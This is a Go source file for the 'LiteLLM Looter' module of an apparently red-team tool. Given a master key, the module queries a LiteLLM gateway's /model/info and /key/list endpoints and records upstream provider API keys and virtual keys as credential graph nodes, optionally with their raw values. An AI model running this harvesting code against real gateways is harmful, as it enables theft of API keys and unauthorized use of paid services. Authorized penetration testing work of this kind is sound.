// Package litellmloot implements the v0.2 LiteLLM Looter — the action
// that turns a discovered :LiteLLMGateway:AIService node into the
// upstream credential nodes that make the credential-chain demo land.
//
// Operator workflow:
//
//	agenthound scan 172.20.0.0/24 --output -          // Phase 2/3: find LiteLLM
//	agenthound loot 172.20.0.10:4000 --type litellm \
//	    --master-key sk-... \
//	    --engagement-id RTV-DEMO --output -
//
// Probes (GET only — Looters are read-only by contract):
//   - GET /model/info     (lists upstream provider models + their api_base)
//   - GET /key/list       (master-key only; lists virtual keys + spend)
//
// Emits (per docs/plans/sprint3-offensive-primitives.md 4.5):
//   - 1 :Credential master node (the master key the operator supplied,
//     value_hash populated so the cross-collector chain can join)
//   - N :Credential upstream nodes (one per provider in /model/info,
//     where N is bounded by MaxItems)
//   - M :Credential virtual-key nodes (one per /key/list entry)
//   - 1 :EXPOSES_CREDENTIAL edge per emitted Credential, all anchored
//     on the LiteLLMGateway node
package litellmloot

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log/slog"
	"net/http"
	"strings"
	"time"

	"github.com/adithyan-ak/agenthound/sdk/action"
	"github.com/adithyan-ak/agenthound/sdk/common"
	"github.com/adithyan-ak/agenthound/sdk/ingest"
)

const (
	DefaultPort         = 4000
	DefaultProbeTimeout = 30 * time.Second
	DefaultMaxItems     = 1000
)

// Looter is the registered module.
type Looter struct{}

// Loot probes a LiteLLM gateway with the operator-supplied master key
// and emits Credential nodes + EXPOSES_CREDENTIAL edges for every
// upstream provider key and virtual key the gateway exposes.
//
// opts.Credentials must contain a "master_key" entry. Other keys are
// ignored. PartialErrors is populated when individual probes fail; the
// Looter returns useful results and the failure list rather than
// aborting on the first 401.
func (l *Looter) Loot(ctx context.Context, t action.Target, opts action.LootOptions) (*action.LootResult, error) {
	masterKey := opts.Credentials["master_key"]
	if masterKey == "" {
		return nil, errors.New("litellm loot: --master-key (or --credential master_key=...) is required")
	}

	baseURL := action.EndpointBaseURL(t, DefaultPort, "http")
	gatewayObjectID := ingest.ComputeNodeID("LiteLLMGateway", baseURL)

	timeout := opts.Timeout
	if timeout <= 0 {
		timeout = DefaultProbeTimeout
	}
	maxItems := opts.MaxItems
	if maxItems <= 0 {
		maxItems = DefaultMaxItems
	}

	client := &http.Client{
		Timeout: timeout,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	res := &action.LootResult{
		IngestData: &ingest.IngestData{},
	}

	// 1. The master-key Credential — emitted FIRST and unconditionally.
	//    value_hash is the cross-collector merge primitive; the Config
	//    Collector emits a Credential with the same value_hash for the
	//    same secret seen as an env var, and the
	//    cross_service_credential_chain post-processor (Phase 5) joins
	//    on this property. Without this node the demo fails silently.
	masterValueHash := common.HashCredentialValue(masterKey)
	masterID := ingest.ComputeNodeID("Credential", baseURL, "litellm-master")
	masterProps := map[string]any{
		"objectid":     masterID,
		"type":         "master_key",
		"name":         "litellm-master",
		"source":       "litellm",
		"is_exposed":   true,
		"high_entropy": true,
		"format":       "litellm",
		"value_hash":   masterValueHash,
	}
	if opts.IncludeCredentialValues {
		masterProps["value"] = masterKey
	}
	res.IngestData.Graph.Nodes = append(res.IngestData.Graph.Nodes, ingest.Node{
		ID:         masterID,
		Kinds:      []string{"Credential"},
		Properties: masterProps,
	})
	res.IngestData.Graph.Edges = append(res.IngestData.Graph.Edges,
		exposesCredentialEdge(gatewayObjectID, masterID, opts.EngagementID, "master_key", baseURL))

	res.Summary.EndpointsProbed++
	res.Summary.CredentialsFound++

	// 2. /model/info → upstream provider Credentials.
	modelInfoURL := strings.TrimRight(baseURL, "/") + "/model/info"
	res.Summary.EndpointsProbed++
	upstreamCreds, modelInfoErr := fetchModelInfo(ctx, client, modelInfoURL, masterKey, maxItems)
	if modelInfoErr != nil {
		slog.Warn("litellm loot: /model/info failed",
			"endpoint", modelInfoURL,
			"key_prefix", redact(masterKey),
			"engagement_id", opts.EngagementID,
			"error", modelInfoErr)
		res.PartialErrors = append(res.PartialErrors, fmt.Sprintf("model/info: %v", modelInfoErr))
		res.Summary.PartialFailures++
	}
	for _, uc := range upstreamCreds {
		credID := ingest.ComputeNodeID("Credential", baseURL, "upstream-"+uc.Name)
		props := map[string]any{
			"objectid":     credID,
			"type":         "apiKey",
			"name":         "upstream-" + uc.Name,
			"provider":     uc.Provider,
			"source":       "litellm",
			"is_exposed":   true,
			"high_entropy": true,
			"format":       "upstream-provider",
			"value_hash":   uc.ValueHash,
		}
		if opts.IncludeCredentialValues && uc.Value != "" {
			props["value"] = uc.Value
		}
		res.IngestData.Graph.Nodes = append(res.IngestData.Graph.Nodes, ingest.Node{
			ID: credID, Kinds: []string{"Credential"}, Properties: props,
		})
		res.IngestData.Graph.Edges = append(res.IngestData.Graph.Edges,
			exposesCredentialEdge(gatewayObjectID, credID, opts.EngagementID, "model_info", uc.Endpoint))
		res.Summary.CredentialsFound++
	}

	// 3. /key/list → virtual key Credentials. Failure here does NOT
	//    block the result — many LiteLLM deployments restrict /key/list.
	keyListURL := strings.TrimRight(baseURL, "/") + "/key/list"
	res.Summary.EndpointsProbed++
	virtKeys, keyListErr := fetchKeyList(ctx, client, keyListURL, masterKey, maxItems)
	if keyListErr != nil {
		slog.Warn("litellm loot: /key/list failed",
			"endpoint", keyListURL,
			"key_prefix", redact(masterKey),
			"engagement_id", opts.EngagementID,
			"error", keyListErr)
		res.PartialErrors = append(res.PartialErrors, fmt.Sprintf("key/list: %v", keyListErr))
		res.Summary.PartialFailures++
	}
	for _, vk := range virtKeys {
		credID := ingest.ComputeNodeID("Credential", baseURL, "virtual-"+vk.KeyID)
		props := map[string]any{
			"objectid":     credID,
			"type":         "virtual_key",
			"name":         "virtual-" + vk.KeyID,
			"source":       "litellm",
			"is_exposed":   true,
			"high_entropy": false,
			"format":       "litellm-virtual",
			"value_hash":   vk.ValueHash,
			"spend_usd":    vk.Spend,
			"models":       vk.Models,
		}
		if opts.IncludeCredentialValues && vk.Value != "" {
			props["value"] = vk.Value
		}
		res.IngestData.Graph.Nodes = append(res.IngestData.Graph.Nodes, ingest.Node{
			ID: credID, Kinds: []string{"Credential"}, Properties: props,
		})
		res.IngestData.Graph.Edges = append(res.IngestData.Graph.Edges,
			exposesCredentialEdge(gatewayObjectID, credID, opts.EngagementID, "key_list", baseURL))
		res.Summary.CredentialsFound++
	}

	slog.Info("litellm loot complete",
		"endpoint", baseURL,
		"key_prefix", redact(masterKey),
		"engagement_id", opts.EngagementID,
		"credentials_found", res.Summary.CredentialsFound,
		"partial_failures", res.Summary.PartialFailures)

	return res, nil
}

// upstreamCred captures one upstream provider key extracted from
// LiteLLM's /model/info response. value is set only when LiteLLM's
// response leaked the actual key; value_hash is always populated.
type upstreamCred struct {
	Name      string // sanitized name (provider/model)
	Provider  string // openai, anthropic, aws_bedrock, etc.
	Endpoint  string // upstream api_base (LiteLLM exposes this in model_info)
	Value     string // raw upstream key, if exposed by /model/info
	ValueHash string // SHA-256 over the upstream key OR over the synthesized identity when no key surfaced
}

// virtualKey captures one /key/list entry.
type virtualKey struct {
	KeyID     string
	Value     string
	ValueHash string
	Spend     float64
	Models    []string
}

// fetchModelInfo issues GET /model/info with the master key and parses
// the response leniently. LiteLLM's response shape has drifted across
// minor versions; the parser accepts any object with a "data" array of
// model entries, each with a "model_info" sub-object whose key shape
// varies. Unknown fields are skipped; missing fields produce no
// upstreamCred for that entry rather than an error.
func fetchModelInfo(ctx context.Context, client *http.Client, url, masterKey string, maxItems int) ([]upstreamCred, error) {
	body, err := getJSON(ctx, client, url, masterKey)
	if err != nil {
		return nil, err
	}
	type rawEntry struct {
		ModelName     string         `json:"model_name"`
		LiteLLMParams map[string]any `json:"litellm_params"`
		ModelInfo     map[string]any `json:"model_info"`
	}
	type rawResp struct {
		Data []rawEntry `json:"data"`
	}
	var parsed rawResp
	if err := json.Unmarshal(body, &parsed); err != nil {
		return nil, fmt.Errorf("decode /model/info: %w", err)
	}

	var out []upstreamCred
	for _, e := range parsed.Data {
		if len(out) >= maxItems {
			break
		}
		uc := upstreamCred{
			Name:     sanitizeName(e.ModelName),
			Provider: extractProvider(e),
		}
		if v, ok := e.LiteLLMParams["api_base"].(string); ok {
			uc.Endpoint = v
		}
		// Some LiteLLM versions surface api_key in litellm_params (rare —
		// usually masked, but worth recording when present). Even when no
		// raw key is exposed we still emit the upstream Credential node
		// because the existence of the upstream is itself the leak — the
		// master key implies access to it. value_hash for these nodes
		// hashes a synthetic identity (provider:model_name) so the
		// per-provider node is deterministic across re-runs.
		if v, ok := e.LiteLLMParams["api_key"].(string); ok && v != "" {
			uc.Value = v
			uc.ValueHash = common.HashCredentialValue(v)
		} else {
			uc.ValueHash = common.HashCredentialValue(uc.Provider + ":" + uc.Name)
		}
		out = append(out, uc)
	}
	return out, nil
}

// fetchKeyList issues GET /key/list with the master key.
func fetchKeyList(ctx context.Context, client *http.Client, url, masterKey string, maxItems int) ([]virtualKey, error) {
	body, err := getJSON(ctx, client, url, masterKey)
	if err != nil {
		return nil, err
	}
	type rawKey struct {
		Token  string   `json:"token"`  // sometimes the hashed token
		KeyID  string   `json:"key_id"` // newer LiteLLM versions
		Spend  float64  `json:"spend"`
		Models []string `json:"models"`
	}
	type rawResp struct {
		Keys []rawKey `json:"keys"`
	}
	var parsed rawResp
	if err := json.Unmarshal(body, &parsed); err != nil {
		// Try the legacy shape: bare array.
		var legacy []rawKey
		if err2 := json.Unmarshal(body, &legacy); err2 == nil {
			parsed.Keys = legacy
		} else {
			return nil, fmt.Errorf("decode /key/list: %w", err)
		}
	}
	var out []virtualKey
	for _, k := range parsed.Keys {
		if len(out) >= maxItems {
			break
		}
		id := k.KeyID
		if id == "" {
			id = k.Token
		}
		if id == "" {
			continue
		}
		vk := virtualKey{
			KeyID:  id,
			Value:  k.Token,
			Spend:  k.Spend,
			Models: k.Models,
		}
		// LiteLLM's /key/list typically returns hashed tokens; if the raw
		// token surfaces (e.g. on a misconfigured deployment) hash it,
		// otherwise hash the deterministic key_id.
		if k.Token != "" {
			vk.ValueHash = common.HashCredentialValue(k.Token)
		} else {
			vk.ValueHash = common.HashCredentialValue("virtual:" + id)
		}
		out = append(out, vk)
	}
	return out, nil
}

// getJSON does the GET-and-read dance with master-key auth. Reads up
// to 16 MiB, then errors. Returns the raw body for the caller to
// json.Unmarshal — the looter parses leniently and we don't want
// double-decoding overhead.
func getJSON(ctx context.Context, client *http.Client, url, masterKey string) ([]byte, error) {
	req, err := http.NewRequestWithContext(ctx, "GET", url, nil)
	if err != nil {
		return nil, fmt.Errorf("build request: %w", err)
	}
	req.Header.Set("Authorization", "Bearer "+masterKey)
	req.Header.Set("Accept", "application/json")
	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("request: %w", err)
	}
	defer func() { _ = resp.Body.Close() }()
	body, err := io.ReadAll(io.LimitReader(resp.Body, 16<<20))
	if err != nil {
		return nil, fmt.Errorf("read body: %w", err)
	}
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return nil, fmt.Errorf("status %d", resp.StatusCode)
	}
	return body, nil
}

// exposesCredentialEdge builds an EXPOSES_CREDENTIAL edge from the
// LiteLLM gateway to a Credential. EngagementID and the source
// endpoint are recorded in evidence so the post-processor can include
// them in the credential-chain finding output.
func exposesCredentialEdge(gatewayID, credID, engagementID, source, endpoint string) ingest.Edge {
	props := map[string]any{
		"confidence":  1.0,
		"risk_weight": 0.1,
		"evidence": map[string]any{
			"endpoint":      endpoint,
			"source":        source,
			"engagement_id": engagementID,
		},
	}
	return ingest.Edge{
		Source:     gatewayID,
		Target:     credID,
		Kind:       "EXPOSES_CREDENTIAL",
		SourceKind: "AIService",
		TargetKind: "Credential",
		Properties: props,
	}
}

// sanitizeName turns a model_name into a property-safe slug.
func sanitizeName(s string) string {
	return strings.ToLower(strings.NewReplacer(" ", "-", "/", "-").Replace(s))
}

// extractProvider best-effort identifies the upstream provider from a
// LiteLLM /model/info entry. LiteLLM puts the provider in litellm_params.model
// as a "openai/gpt-4" prefix; some versions also expose
// model_info.litellm_provider. Falls back to "unknown".
func extractProvider(e struct {
	ModelName     string         `json:"model_name"`
	LiteLLMParams map[string]any `json:"litellm_params"`
	ModelInfo     map[string]any `json:"model_info"`
}) string {
	if v, ok := e.ModelInfo["litellm_provider"].(string); ok && v != "" {
		return v
	}
	if v, ok := e.LiteLLMParams["model"].(string); ok && v != "" {
		if i := strings.IndexByte(v, '/'); i > 0 {
			return v[:i]
		}
	}
	return "unknown"
}

// redact returns the first 8 characters of a secret followed by "..."
// — used in slog output so master keys never appear in full anywhere
// the operator can grep them out of a logfile. The 8-char prefix is
// enough to disambiguate two keys without leaking the secret.
func redact(secret string) string {
	if len(secret) <= 8 {
		return "***"
	}
	return secret[:8] + "..."
}

var _ action.Looter = (*Looter)(nil)
